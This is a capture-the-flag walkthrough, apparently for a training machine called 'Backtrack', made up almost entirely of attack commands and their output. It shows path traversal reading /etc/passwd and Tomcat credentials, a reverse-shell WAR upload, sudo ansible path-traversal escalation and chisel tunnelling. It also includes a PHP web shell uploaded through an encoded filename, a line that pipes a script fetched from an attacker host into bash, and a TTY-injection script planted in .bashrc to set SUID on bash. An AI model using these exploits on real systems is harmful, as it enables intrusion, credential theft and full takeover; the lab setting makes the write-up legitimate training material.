## PORT scanning
```bash
➜  Backtrack nmap -sCV -oN scan.txt -vv 10.10.37.174
...SNIP...
Scanning 10.10.37.174 [1000 ports]
Discovered open port 22/tcp on 10.10.37.174
Discovered open port 8080/tcp on 10.10.37.174
Discovered open port 8888/tcp on 10.10.37.174
```

## CVE-2023-39141 on port 8888
```
curl --path-as-is http://10.10.37.174:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
...SNIP...
tomcat:x:1002:1002::/opt/tomcat:/bin/false
orville:x:1003:1003::/home/orville:/bin/bash
wilbur:x:1004:1004::/home/wilbur:/bin/bash
```

```
➜  Backtrack curl --path-as-is http://10.10.37.174:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

  <role rolename="manager-script"/>
  <user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"/>

</tomcat-users>
```

### Tomcat user
tomcat: OPx52k53D8OkTZpx4fr
```
curl --upload-file revshell.war -u 'tomcat:OPx52k53D8OkTZpx4fr' "http://10.10.37.174:8080/manager/text/deploy?path=/rev"


http://10.10.37.174:8080/rev
```

## PE as tomcat
```
sudo -u wilbur /usr/bin/ansible-playbook /opt/test_playbooks/../../../tmp/test.xml
```
## Wilbur
wilbur:mYe317Tb9qTNrWFND7KF

```
wilbur@Backtrack:~$ cat from_orville.txt
Hey Wilbur, it's Orville. I just finished developing the image gallery web app I told you about last week, and it works just fine. However, I'd like you to test it yourself to see if everything works and secure.
I've started the app locally so you can access it from here. I've disabled registrations for now because it's still in the testing phase. Here are the credentials you can use to log in:

email : orville@backtrack.thm
password : W34r3B3773r73nP3x3l$
```
## port forwarding
```
➜  Backtrack chisel server --reverse --socks5

wilbur@Backtrack:~$ ./chisel client 10.9.0.127:8080 R:80:127.0.0.1:80
```

## orville
```
Content-Disposition: form-data; name="image"; filename="%252e%252e%252ftest.png.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]) ?>


curl localhost:80/test.png.php?cmd=curl%09IP:8000/x|bash
```

```
orville@Backtrack:/home/orville$ cat flag2.txt
THM{01d8e83d0ea776345fa9bf4bc08c249d}
```
### DB Credentials
```
$host = 'localhost';
$dbname = 'backtrack';
$username = 'orville';
$password = '3uK32VD7YRtVHsrehoA3';
```
## Database Data
```
mysql> select * from users;
+----+---------+-----------------------+--------------------------------------------------------------+
| id | name    | email                 | password                                                     |
+----+---------+-----------------------+--------------------------------------------------------------+
|  1 | orville | orville@backtrack.thm | $2y$10$dMzyvDTFnUPr.os1ZdWt1.oM4mUeZvH3OtcgJrww/QrD3o1Eb9XNW |
+----+---------+-----------------------+--------------------------------------------------------------+
```

## PSPY

```
2024/10/26 06:54:04 CMD: UID=1003  PID=20356  | su - orville
2024/10/26 06:54:04 CMD: UID=1003  PID=20357  | -bash
2024/10/26 06:54:04 CMD: UID=1003  PID=20358  | -bash
2024/10/26 06:54:04 CMD: UID=1003  PID=20360  | -bash
2024/10/26 06:54:04 CMD: UID=1003  PID=20359  | -bash
2024/10/26 06:54:04 CMD: UID=1003  PID=20361  | -bash
2024/10/26 06:54:04 CMD: UID=1003  PID=20362  | /bin/sh /usr/bin/lesspipe
2024/10/26 06:54:04 CMD: UID=1003  PID=20365  | -bash
2024/10/26 06:54:06 CMD: UID=1003  PID=20366  | -bash
```
## TTY Pushback
https://www.youtube.com/watch?v=UUn9x7mw1i0&ab_channel=IppSec
**backtoroot.py** place to `/dev/shm/backtoroot.py`
```python
#!/usr/bin/env python3
import fcntl
import termios
import os
import signal

os.kill(os.getppid(), signal.SIGSTOP)

for char in 'chmod +s /bin/bash\n':
    fcntl.ioctl(0, termios.TIOCSTI, char)
```

```bash
echo 'python3 /dev/shm/backtoroot.py' >> /home/orville/.bashrc

bash -p

# root
```
